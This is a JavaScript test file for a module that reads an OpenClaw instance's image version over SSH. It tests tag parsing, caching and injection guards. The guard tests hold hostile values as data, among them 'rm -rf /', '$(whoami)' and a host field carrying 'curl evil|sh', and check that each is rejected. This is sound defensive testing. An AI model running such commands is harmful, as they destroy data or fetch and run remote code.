'use strict';

// Tests for #296 — reading an OpenClaw instance's version (its pinned image
// tag) from the instance .env over SSH, with caching + input validation.

const { describe, it, beforeEach, afterEach } = require('node:test');
const assert = require('node:assert/strict');
const { execSync } = require('node:child_process');
const { setLevel } = require('../lib/logger');

setLevel('error');

const ocv = require('../lib/openclaw-version');

describe('openclaw-version (#296)', () => {
  describe('parseVersion', () => {
    it('extracts the tag from an OPENCLAW_IMAGE line', () => {
      assert.equal(
        ocv.parseVersion('OPENCLAW_IMAGE=ghcr.io/openclaw/openclaw:2026.5.28'),
        '2026.5.28'
      );
    });
    it('tolerates quotes, whitespace, and surrounding lines', () => {
      const env = 'FOO=bar\n  OPENCLAW_IMAGE = "ghcr.io/openclaw/openclaw:2026.5.6"\nBAZ=1';
      assert.equal(ocv.parseVersion(env), '2026.5.6');
    });
    it('returns null when absent or bad input', () => {
      assert.equal(ocv.parseVersion('NOPE=1'), null);
      assert.equal(ocv.parseVersion(''), null);
      assert.equal(ocv.parseVersion(null), null);
    });
    it('parses a bare/local image tag without a registry path (#308)', () => {
      // The real-world 'Volta' case: a locally-built image `openclaw:qmd`,
      // no `openclaw/openclaw` registry path. Pre-#308 this returned null.
      assert.equal(ocv.parseVersion('OPENCLAW_IMAGE=openclaw:qmd'), 'qmd');
      assert.equal(ocv.parseVersion('OPENCLAW_IMAGE=openclaw:latest'), 'latest');
    });
    it('parses non-openclaw / custom registry image names (#308)', () => {
      assert.equal(ocv.parseVersion('OPENCLAW_IMAGE=ghcr.io/openclaw/openclaw:2026.5.28'), '2026.5.28');
      assert.equal(ocv.parseVersion('OPENCLAW_IMAGE="myrepo/custom-claw:v1.2"'), 'v1.2');
    });
    it('does not mistake a registry host:port for a tag (#308)', () => {
      // The last colon precedes a `/`, so it's a host:port, not a tag → null.
      assert.equal(ocv.parseVersion('OPENCLAW_IMAGE=registry.local:5000/openclaw/openclaw'), null);
      // ...but a real tag after the port still parses.
      assert.equal(ocv.parseVersion('OPENCLAW_IMAGE=registry.local:5000/openclaw:edge'), 'edge');
    });
    it('returns null for an untagged image reference (#308)', () => {
      assert.equal(ocv.parseVersion('OPENCLAW_IMAGE=openclaw'), null);
    });
  });

  describe('isSafeInstanceDir', () => {
    it('accepts normal paths including a leading ~', () => {
      assert.equal(ocv.isSafeInstanceDir('~/openclaw-tilt'), true);
      assert.equal(ocv.isSafeInstanceDir('/opt/openclaw'), true);
      assert.equal(ocv.isSafeInstanceDir('openclaw'), true);
    });
    it('rejects shell metacharacters, spaces, and empty', () => {
      for (const bad of ['~/oc; rm -rf /', '$(whoami)', '`id`', 'a b', '', 'x|y', 'a&b', '"q"']) {
        assert.equal(ocv.isSafeInstanceDir(bad), false, `should reject: ${bad}`);
      }
    });
  });

  describe('fetchVersion', () => {
    const conn = (over = {}) => ({
      id: 'c1', host: 'h', sshUser: 'u', sshKeyPath: '~/.ssh/k', instanceDir: '~/openclaw', ...over
    });

    beforeEach(() => { ocv._cache.clear(); });
    afterEach(() => { ocv._internal.exec = execSync; ocv._cache.clear(); });

    it('reads + parses the version over SSH and caches it', () => {
      let calls = 0;
      ocv._internal.exec = () => { calls++; return 'OPENCLAW_IMAGE=ghcr.io/openclaw/openclaw:2026.5.28\n'; };
      const r1 = ocv.fetchVersion(conn());
      assert.equal(r1.version, '2026.5.28');
      assert.equal(r1.error, null);
      assert.equal(r1.cached, false);
      const r2 = ocv.fetchVersion(conn());
      assert.equal(r2.version, '2026.5.28');
      assert.equal(r2.cached, true);
      assert.equal(calls, 1, 'second call served from cache (no second ssh)');
    });

    it('force bypasses the cache', () => {
      let calls = 0;
      ocv._internal.exec = () => { calls++; return 'OPENCLAW_IMAGE=ghcr.io/openclaw/openclaw:2026.5.6'; };
      ocv.fetchVersion(conn());
      ocv.fetchVersion(conn(), { force: true });
      assert.equal(calls, 2);
    });

    it('no instanceDir → error and no ssh attempted', () => {
      let called = false;
      ocv._internal.exec = () => { called = true; return ''; };
      const r = ocv.fetchVersion(conn({ instanceDir: null }));
      assert.equal(r.version, null);
      assert.match(r.error, /no instanceDir/);
      assert.equal(called, false);
    });

    it('unsafe instanceDir → error and no ssh attempted (injection guard)', () => {
      let called = false;
      ocv._internal.exec = () => { called = true; return ''; };
      const r = ocv.fetchVersion(conn({ instanceDir: '~/oc; rm -rf /' }));
      assert.equal(r.version, null);
      assert.match(r.error, /unsafe/);
      assert.equal(called, false);
    });

    it('unsafe host/sshUser/sshKeyPath → error and no ssh attempted (#314 injection guard)', () => {
      let called = false;
      ocv._internal.exec = () => { called = true; return ''; };
      for (const [field, bad, re] of [
        ['host', '10.0.0.1; curl evil|sh', /host/],
        ['sshUser', 'a$(whoami)', /sshUser/],
        ['sshKeyPath', '~/.ssh/k`id`', /sshKeyPath/]
      ]) {
        const r = ocv.fetchVersion(conn({ [field]: bad }));
        assert.equal(r.version, null, `${field} should block`);
        assert.match(r.error, re);
      }
      assert.equal(called, false, 'no ssh runs for an unsafe-shaped target');
    });

    it('ssh failure → surfaces an error, no crash', () => {
      ocv._internal.exec = () => { const e = new Error('boom'); e.stderr = 'conn refused'; throw e; };
      const r = ocv.fetchVersion(conn());
      assert.equal(r.version, null);
      assert.match(r.error, /ssh read failed/);
    });

    it('image line missing in .env → version null with a reason', () => {
      ocv._internal.exec = () => 'SOMETHING=else\n';
      const r = ocv.fetchVersion(conn());
      assert.equal(r.version, null);
      assert.match(r.error, /not found/);
    });
  });
});
